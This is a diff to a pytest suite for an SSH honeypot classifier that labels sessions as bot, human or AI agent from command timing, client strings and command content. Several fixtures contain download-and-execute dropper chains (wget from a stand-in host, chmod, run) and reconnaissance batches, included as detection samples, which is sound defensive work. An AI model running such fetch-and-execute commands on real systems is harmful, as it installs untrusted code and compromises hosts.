@@ -81,7 +81,7 @@ def test_client_signals():
     labels = {x.label for x in c.client_signals(Session("x", client="SSH-2.0-paramiko_3.4"))}
     assert labels == {"bot", "agent"}
     labels = {x.label for x in c.client_signals(Session("x", client="SSH-2.0-OpenSSH_9.6"))}
-    assert labels == {"human", "agent"}
+    assert labels == {"human"}
     assert c.client_signals(Session("x")) == []
 
 
@@ -327,3 +327,119 @@ def test_labeled_batches_are_an_agent_habit():
 def test_plain_semicolon_chains_are_still_bot():
     s = _with_cmds([0.3, 0.3], ["cd /tmp; wget http://x.invalid/a; chmod +x a; ./a", "uname -a", "w"])
     assert "semicolon_chain" in {x.key for x in c.content_signals(s)}
+
+
+# ---- second pass: exit, loose vs regular timing, human habits, agent batching ----
+
+def test_a_final_exit_is_not_a_timing_gap():
+    # 4 commands and an exit: only 3 real gaps, too few for steady
+    s = _with_cmds([5, 5.5, 5, 6], ["ls", "cat README.md", "whoami", "uptime", "exit"])
+    assert c.timing_signals(s) == []
+
+
+def test_loosely_even_pauses_are_weak():
+    sig = c.timing_signals(_with_cmds([3, 7, 4, 8, 5]))[0]
+    assert sig.key == "timing_even"
+    assert sig.weight == 1.0
+
+
+def test_truly_regular_pauses_stay_strong():
+    sig = c.timing_signals(_with_cmds([5, 5.2, 4.9, 5.1, 5]))[0]
+    assert sig.key == "timing_steady"
+    assert sig.weight > 1.0
+
+
+def test_short_single_commands_lean_human():
+    s = _with_cmds([4, 6, 5], ["ls", "whoami", "uptime", "pwd"])
+    assert "plain_commands" in {x.key for x in c.content_signals(s)}
+    s = _with_cmds([4, 6, 5], ["ls; id; w; uname -a", "cat /etc/os-release | head -3; df -h", "free -m", "uptime"])
+    assert "plain_commands" not in {x.key for x in c.content_signals(s)}
+
+
+def test_command_not_found_counts_as_a_slip():
+    s = Session("x")
+    s.add_command(0, "ls", "README.md")
+    s.add_command(4, "gti status", "-bash: gti: command not found")
+    s.add_command(8, "ls", "README.md")
+    assert "typos" in {x.key for x in c.content_signals(s)}
+
+
+def test_command_not_found_inside_a_batch_is_not_a_slip():
+    s = Session("x")
+    s.add_command(0, "getent group sudo; echo '== x =='; nmcli dev", "-bash: nmcli: command not found")
+    assert "typos" not in {x.key for x in c.content_signals(s)}
+
+
+def test_interactive_client_is_a_human_signal():
+    sigs = c.client_signals(Session("x", client="SSH-2.0-PuTTY_Release_0.80"))
+    assert [(x.label, x.key) for x in sigs] == [("human", "client_interactive")]
+
+
+def test_sim_human_short_shape_is_human_or_unknown():
+    s = _short_human()
+    s.add_command(s.commands[-1]["ts"] + 2.0, "exit", "logout")
+    assert c.score(s).kind in ("human", "unknown")
+
+
+def test_two_char_markers_count_as_batches():
+    lines = ["echo '== CPU/MEM =='; nproc; free -h; echo '== DISK =='; df -h /",
+             "echo '== LISTEN =='; ss -tlnp; echo '== SUDO =='; sudo -n -l 2>&1 | head"]
+    keys = {x.key for x in c.content_signals(_with_cmds([5], lines))}
+    assert "labeled_batches" in keys
+    assert "semicolon_chain" not in keys
+
+
+def test_guarded_chains_are_agent_style():
+    lines = ["ls -la /opt; cat /etc/hostname; ps aux 2>/dev/null | head; ss -tlnp 2>/dev/null",
+             "id; groups; sudo -n true 2>&1; crontab -l 2>/dev/null"]
+    keys = {x.key for x in c.content_signals(_with_cmds([5], lines))}
+    assert "labeled_batches" in keys
+    assert "semicolon_chain" not in keys
+
+
+def test_a_guarded_dropper_chain_is_still_bot():
+    lines = ["cd /tmp || cd /var/run; wget http://a.b/x 2>/dev/null; chmod 777 x; ./x", "uname -a"]
+    keys = {x.key for x in c.content_signals(_with_cmds([0.3], lines))}
+    assert "semicolon_chain" in keys
+    assert "labeled_batches" not in keys
+
+
+def _model_agent(notice=True):
+    """scripted library, model-paced turns, batched lines, one parallel call."""
+    s = Session("x", client="SSH-2.0-AsyncSSH_2.24.1")
+    s.add_login(0.0, "team", True)
+    lines = ["whoami; id; hostname; uname -a; uptime",
+             "echo '== CPU/MEM =='; nproc; free -h; echo '== DISK =='; df -h /",
+             "echo '== LISTEN =='; ss -tlnp; echo '== PROCS =='; ps aux | head -20",
+             "echo '== NGINX =='; ls -la /etc/nginx/sites-enabled/; cat /etc/nginx/nginx.conf",
+             "echo '== HOME =='; ls -la ~; cat ~/README.md",
+             "echo '== APP =='; ls -la /opt/app; cat /opt/app/docker-compose.yml",
+             "echo '== HEALTH =='; curl -s http://127.0.0.1:8000/health; echo '== WWW =='; ls /var/www/html"]
+    t = 4.0
+    for gap, line in zip([0, 3.2, 5.1, 0.03, 6.4, 4.0, 7.3], lines):
+        t += gap
+        s.add_command(t, line, "")
+        if notice and "README" in line:
+            _trip(s, "agent_notice_read", t)
+    return s
+
+
+@pytest.mark.parametrize("notice", [True, False])
+def test_model_paced_batching_library_is_a_confident_agent(notice):
+    v = c.score(_model_agent(notice))
+    assert v.kind == "agent"
+    assert v.confidence >= 0.7
+
+
+def test_subshell_parens_are_not_typos():
+    assert not c._typo("(grep")
+    assert not c._typo("head)")
+    assert c._typo("(whoamii")
+
+
+def test_batched_lines_dont_count_as_typing_habits():
+    lines = ["echo '== AUTH =='; (grep -h 'Failed' /var/log/auth.log* 2>/dev/null | head); cd /opt; ls",
+             "echo '== APP =='; cd /opt/app; ls -la; cd /var/www; ls"]
+    keys = {x.key for x in c.content_signals(_with_cmds([5], lines))}
+    assert "typos" not in keys
+    assert "wandering" not in keys
